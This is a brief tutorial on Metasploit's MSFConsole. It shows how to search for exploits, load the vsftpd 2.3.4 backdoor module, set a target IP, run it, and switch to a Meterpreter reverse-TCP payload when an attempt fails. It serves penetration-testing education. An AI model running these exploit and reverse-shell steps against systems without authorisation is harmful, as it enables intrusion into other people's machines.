# Metasploit - MSFConsole Guide

##  Introduction
Metasploit is a powerful **penetration testing framework** that provides a variety of exploits, payloads, and auxiliary tools for security assessments. The **MSFConsole** is the main command-line interface for interacting with Metasploit.

---

##  Finding Exploits
Before using Metasploit, you can search for available exploits using **SearchSploit** or within **MSFConsole**.

### **Using SearchSploit (Offline Exploit Database)**
```bash
searchsploit <query>
```
- Looks up exploits from **Exploit-DB**.
- Example:
  ```bash
  searchsploit Apache 2.4
  ```

### **Using MSFConsole to Search for Exploits**
```bash
msfconsole
search <query>
```
- Example:
  ```bash
  search vsftpd
  ```
- This will return all matching **exploits, auxiliary modules, and payloads**.

---

##  Using an Exploit
Once an exploit is found, load it into the console.

### **Select an Exploit**
```bash
use <exploit_name>
```
- Example:
  ```bash
  use exploit/unix/ftp/vsftpd_234_backdoor
  ```

### **Checking Available Options**
```bash
options
```
- Displays required parameters (e.g., **RHOSTS**, **LPORT**, **PAYLOAD**).

---

##  Setting Target & Payload
### **Set the Target IP Address**
```bash
set RHOSTS <target_ip>
```
- Example:
  ```bash
  set RHOSTS 192.168.1.100
  ```

### **Confirm Current Options**
```bash
options
```
- Verify if required parameters are properly configured.

### **Check Available Targets**
```bash
show targets
```
- Lists **supported OS and versions** for the exploit.

### **Run the Exploit**
```bash
run
```
- Attempts to execute the exploit on the target system.

---

##  Troubleshooting: If the Exploit Fails
Sometimes, an exploit may fail or **crash unexpectedly**. Try the following steps:

1. **Check Available Options Again**
   ```bash
   options
   ```
   - This may display **additional parameters** required.

2. **Change the Payload**
   ```bash
   set payload <query>
   ```
   - Example:
     ```bash
     set payload linux/x86/meterpreter/reverse_tcp
     ```

3. **Confirm Payload Works**
   ```bash
   options
   ```
   - Ensure the **new payload** settings are applied correctly.

4. **Run the Exploit Again**
   ```bash
   run
   ```

---

##  Conclusion
Metasploit is an essential tool for penetration testing, and **understanding how to search, configure, and troubleshoot exploits** is key. If an exploit fails, **experiment with different payloads and configurations** to improve success rates.

